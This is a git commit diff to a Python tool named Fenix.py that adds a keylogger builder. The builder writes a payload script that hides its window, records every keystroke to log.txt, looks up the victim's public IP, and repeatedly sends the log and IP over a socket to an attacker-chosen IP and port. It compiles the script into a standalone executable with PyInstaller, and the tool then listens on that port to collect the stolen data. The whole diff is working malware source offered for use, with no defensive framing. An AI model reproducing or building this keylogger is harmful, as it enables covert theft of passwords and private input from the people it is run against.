508e7874b8de37a929fef8ac9b8389c0b6f20b9b
Ws49 <senhaisaque@gmail.com>
2025-01-21 21:56:41 -0300

    Version5

--- Fenix.py
+++ Fenix.py
@@ -3,11 +3,85 @@ import socket
 from http import client
 import os
 
-fenix = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
-fenix.settimeout(None)
-fenix.bind(('localhost', 8080))
-fenix.listen(1)
+os.system('pip install pyinstaller')
+os.system('pip install pynput')
+os.system('pip install pywin32')
+os.system('pip install requests')
 
+def generate_exeLogger(ip,port):
+    payload = f"""
+from pynput.keyboard import Listener
+import os
+import subprocess
+import threading
+import win32gui
+import win32con
+from http import client
+import socket
+from multiprocessing import connection
+import requests
+
+
+hwnd = win32gui.GetForegroundWindow()
+win32gui.ShowWindow(hwnd, win32con.SW_HIDE)
+def get_public_ip():
+    response = requests.get('https://api.ipify.org?format=json')
+    ip_info = response.json()
+    return ip_info['ip']
+
+
+def update_dados():
+    while True:
+        ip_public = get_public_ip()
+
+        try:
+            nexus = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+            nexus.connect(('{ip}', {port}))
+
+            namefile = "log.txt"
+
+            with open(namefile,"rb") as file:
+                for data in file.readlines():
+                    nexus.send(data)
+                    
+            ip_public = ";" + ip_public
+            nexus.send(ip_public.encode())
+            nexus.send(b";END_OF_FILE")
+            
+        except Exception as e:
+            print(e)        
+        
+
+thread_update = threading.Thread(target=update_dados)
+thread_update.start()
+
+def log(teclado):
+
+    with open('log.txt','a') as arq_log:
+        
+        if str(teclado) != 'Key.space' and str(teclado) != 'Key.enter' :   
+            arq_log.write(str(teclado))
+        elif str(teclado) == 'Key.space':
+            arq_log.write("  ")
+        elif str(teclado) == 'Key.enter':
+            arq_log.write("\\n")
+        
+       
+
+with Listener(on_press=log) as monitor:
+   monitor.join()    
+    
+    
+    
+    """
+    with open("Key.py", 'w') as file:
+        file.write(payload)
+    file.close()
+    
+    os.system('pyinstaller Key.py --onefile')
+    print("|Payload Create Sucess!")
+    
+os.system("cls")
 os.system("color 2")           
 
 print("███████╗                      ███████╗                      ███╗░░██╗                      ██╗                      ██╗░░██╗")
@@ -69,11 +143,15 @@ print("██║░░░░░ ██║ ░╚═══██╗ ░░�
 print("███████╗ ██║ ██████╔╝ ░░░██║░░░ ███████╗ ██║░╚███║ ██║ ██║░╚███║ ╚██████╔╝ ██╗ ██╗ ██╗")
 print("╚══════╝ ╚═╝ ╚═════╝░ ░░░╚═╝░░░ ╚══════╝ ╚═╝░░╚══╝ ╚═╝ ╚═╝░░╚══╝ ░╚═════╝░ ╚═╝ ╚═╝ ╚═╝  ")                                                                                          
                                                                                                                                             
-                                                                                                                                            
-                                                                                                                                            
-                                                                                                                                            
-                                                                                                                                            
-                                                                                                                                            
+ip = input('IP: ')                                                                                                                                           
+port = input('PORT: ') 
+                                                                                                                                                                                                                                                                                                                                                 
+generate_exeLogger(str(ip), int(port))
+
+fenix = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+fenix.settimeout(None)
+fenix.bind((str(ip), int(port)))
+fenix.listen(1)                                                                                                                                            
                                                                                                                                             
                                                                                                                                             
                                                                                                                                             
